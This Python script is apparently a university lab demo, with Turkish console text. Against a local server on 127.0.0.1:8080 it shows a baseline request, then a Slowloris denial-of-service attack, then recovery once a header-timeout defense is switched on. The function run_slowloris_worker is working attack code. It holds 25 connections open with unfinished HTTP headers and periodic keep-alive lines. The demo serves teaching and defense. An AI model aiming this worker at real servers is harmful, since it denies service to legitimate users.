import asyncio
import http.client
import socket
import sys
import threading
import time
import urllib.request

if sys.platform.startswith("win"):
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

def send_user_test() -> tuple[bool, int, float, str]:
    start = time.perf_counter()
    conn = None
    try:
        conn = http.client.HTTPConnection("127.0.0.1", 8080, timeout=1.5)
        conn.request("GET", "/")
        res = conn.getresponse()
        _ = res.read()
        lat = (time.perf_counter() - start) * 1000.0
        return (res.status == 200, res.status, lat, f"HTTP {res.status}")
    except Exception as e:
        lat = (time.perf_counter() - start) * 1000.0
        return (False, 0, lat, f"Zaman Aşımı / Bağlantı Reddedildi ({type(e).__name__})")
    finally:
        if conn:
            conn.close()

def set_defense(enable: bool):
    try:
        endpoint = "/api/defense/enable" if enable else "/api/defense/disable"
        with urllib.request.urlopen(f"http://127.0.0.1:8080{endpoint}", timeout=1.0) as res:
            pass
    except Exception:
        pass

def run_slowloris_worker(stop_event: threading.Event):
    sockets = []
    try:
        for i in range(25):
            if stop_event.is_set():
                break
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2.0)
                s.connect(("127.0.0.1", 8080))
                s.send(f"GET /?{i} HTTP/1.1\r\nUser-Agent: Slowloris-Jury-Demo\r\n".encode("utf-8"))
                sockets.append(s)
            except Exception:
                pass
            time.sleep(0.04)

        while not stop_event.is_set():
            for s in list(sockets):
                try:
                    s.send(b"X-a: b\r\n")
                except Exception:
                    sockets.remove(s)
            time.sleep(3.0)

    finally:
        for s in sockets:
            try:
                s.close()
            except Exception:
                pass

def main():
    print("\n" + "=" * 80)
    print("      JÜRİ SUNUMU: KATMAN 7 SLOWLORIS SALDIRISI VE SİBER SAVUNMA DEMOSU")
    print("      Trakya Üniversitesi Bilgisayar Mühendisliği Laboratuvarı")
    print("=" * 80)
    print("[*] Dashboard adresi: http://127.0.0.1:8080/")
    print("[*] İzleme terminali: python monitor.py\n")

    set_defense(enable=False)
    time.sleep(0.5)

    print("[1. AŞAMA] Normal Çalışma Koşulları Test Ediliyor...")
    success, code, lat, msg = send_user_test()
    if success:
        print(f"  [OK] Meşru Kullanıcı Siteye Erişti: {msg} ({lat:.2f} ms)")
        print("  -> Web Dashboard Durumu: YEŞİL (SİSTEM ÇEVRİMİÇİ VE KARARLI)\n")
    else:
        print(f"  [!] Sunucuya ulaşılamadı ({msg}). Sunucunun açık olduğundan emin olun.")
        return

    time.sleep(2.0)

    print("[2. AŞAMA] Slowloris Saldırısı Başlatılıyor...")
    print("  [*] 25 adet yavaş bağlantı sunucunun TCP bağlantı havuzuna enjekte ediliyor...")
    print("  [*] Başlıklar bilerek bitirilmiyor (\r\n\r\n gönderilmiyor)...")

    stop_event = threading.Event()
    attack_thread = threading.Thread(target=run_slowloris_worker, args=(stop_event,), daemon=True)
    attack_thread.start()

    time.sleep(1.8)

    print("\n  [*] Saldırı altında sıradan bir kullanıcı tarayıcıdan girmeyi deniyor:")
    time.sleep(0.4)

    success, code, lat, msg = send_user_test()
    print("-" * 80)
    if not success or code == 503:
        print("  [!] HİZMET KESİNTİSİ (DoS) BAŞARIYLA KANITLANDI!")
        print(f"  Kullanıcı Yanıtı : {msg}")
        print("  Teşhis           : Slowloris tüm TCP bağlantı havuzunu (25/25) kilitledi.")
        print("                     Yeni gelen meşru kullanıcıya hizmet verilemiyor!")
        print("  Dashboard Durumu : KIRMIZI ALARM (KRİTİK ANOMALİ: SLOWLORIS SALDIRISI)")
    else:
        print(f"  Yanıt: {msg} ({lat:.2f} ms)")
    print("-" * 80 + "\n")

    time.sleep(3.0)

    print("[3. AŞAMA] Siber Savunma Koruması Devreye Alınıyor (Anti-Slowloris + WAF)...")
    stop_event.set()
    set_defense(enable=True)
    print("  [OK] Anti-Slowloris Header Timeout (2.5s) AKTİF EDİLDİ.")
    print("  [*] Sunucu yavaş başlık gönderen şüpheli soketleri anında düşürüyor...")
    time.sleep(3.0)

    print("\n  [*] Saldırı engellendikten sonra meşru kullanıcı tekrar siteye girmeyi deniyor:")
    time.sleep(0.5)

    success, code, lat, msg = send_user_test()
    print("-" * 80)
    if success:
        print("  [OK] SİBER SAVUNMA BAŞARILI OLDU! MEŞRU TRAFİK KURTARILDI!")
        print(f"  Kullanıcı Yanıtı : HTTP 200 OK ({lat:.2f} ms)")
        print("  Açıklama         : Yavaş soketler düşürüldüğü için bağlantı havuzu boşaltıldı.")
        print("                     Meşru kullanıcılar kesintisiz hizmet almaya devam ediyor.")
        print("  Dashboard Durumu : YEŞİL (SİSTEM GÜVENLİ VE ÇEVRİMİÇİ)")
    else:
        print(f"  Kullanıcı yanıtı: {msg}")
    print("-" * 80 + "\n")

    stop_event.set()
    time.sleep(0.5)
    print("[*] Jüri sunum testi başarıyla tamamlandı.\n")

if __name__ == "__main__":
    main()
